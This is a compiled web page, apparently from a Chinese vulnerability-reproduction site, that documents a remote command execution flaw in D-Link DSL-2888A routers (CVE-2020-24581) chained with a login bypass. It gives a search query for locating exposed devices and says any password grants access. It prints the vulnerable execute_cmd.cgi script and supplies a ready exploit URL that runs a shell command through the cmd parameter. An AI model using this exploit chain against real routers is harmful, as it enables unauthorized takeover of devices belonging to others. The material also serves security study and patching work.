import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as i,a as s,b as n,d as l,e as a}from"./app-58e4a7d6.js";const c={},r=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>D-Link DSL-2888A AU_2.31_V1.1.47ae55之前版本存在安全漏洞，该漏洞源于包含一个execute cmd.cgi特性(不能通过web用户界面访问)，该特性允许经过身份验证的用户执行操作系统命令。 在该版本固件中同时存在着一个不安全认证漏洞（CVE-2020-24580），在登录界面输入任意密码就可以成功访问路由器界面。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>D-Link DSL-2888A
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;DSL-2888A&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面输入任意密码建立连接</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162221283.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9),u={href:"http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail",target:"_blank",rel:"noopener noreferrer"},d=a(`<p>漏洞出现在 <strong>execute_cmd.cgi</strong> 文件中</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token shebang important">#!/bin/sh</span>
<span class="token builtin class-name">.</span> /usr/syscfg/api_log.sh

<span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span><span class="token builtin class-name">echo</span> $<span class="token punctuation">{</span>QUERY_STRING<span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token operator">=</span> <span class="token parameter variable">-f</span> <span class="token number">3</span><span class="token variable">\`</span></span>
<span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span><span class="token builtin class-name">echo</span> $<span class="token punctuation">{</span>cmd<span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">&quot;%20&quot;</span> <span class="token string">&quot; &quot;</span><span class="token variable">\`</span></span>

<span class="token assign-left variable">result</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span>$<span class="token punctuation">{</span>cmd<span class="token punctuation">}</span><span class="token variable">\`</span></span>
TGP_Log <span class="token variable">\${TGP_LOG_WARNING}</span> <span class="token string">&quot;cmd=<span class="token variable">\${cmd}</span>, result=<span class="token variable">\${result}</span>&quot;</span>

<span class="token builtin class-name">echo</span> <span class="token string">&quot;Content-type: text/html&quot;</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;&quot;</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token variable">\${result}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里取出 <strong>\${QUERY_STRING}</strong> 中的第二个参数值，然后去除空格命令执行</p><p>在这个过程中并没有过滤，看一下参数从哪来的</p><p>文件 <strong>/www/js/ajax.js</strong></p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token function-variable function">get</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_dataType</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">var</span> _url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>url<span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>_url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">&#39;?&#39;</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
			_url <span class="token operator">+=</span> <span class="token string">&#39;?timestamp=&#39;</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span>
			_url <span class="token operator">+=</span> <span class="token string">&quot;&amp;timestamp=&quot;</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>queryString<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
			_url <span class="token operator">+=</span> <span class="token string">&quot;&amp;&quot;</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>queryString<span class="token punctuation">;</span>

		<span class="token keyword">this</span><span class="token punctuation">.</span>xmlHttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> _url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">/* will make IE11 fail.
		if(!document.all){
			if(_dataType == &quot;xml&quot;)
				this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);
			else
				this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  
		}
		*/</span>
		<span class="token keyword">this</span><span class="token punctuation">.</span>xmlHttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看一下过程</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>root<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span>
└─<span class="token comment"># echo &quot;timestamp=1589333279490&amp;cmd=whoami&quot; |  cut -d = -f 3</span>
<span class="token function">whoami</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里取第二个参数 <strong>whoami</strong> 然后就没有过滤的执行了</p><p>所以EXP为:</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=test&amp;cmd=whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162221670.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function k(m,v){const t=p("ExternalLinkIcon");return o(),i("div",null,[r,s("p",null,[n("跳转到 "),s("a",u,[n("http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail"),l(t)]),n(" 显示密码错误")]),d])}const h=e(c,[["render",k],["__file","D-Link DSL-28881A 远程命令执行 CVE-2020-24581.html.vue"]]);export{h as default};
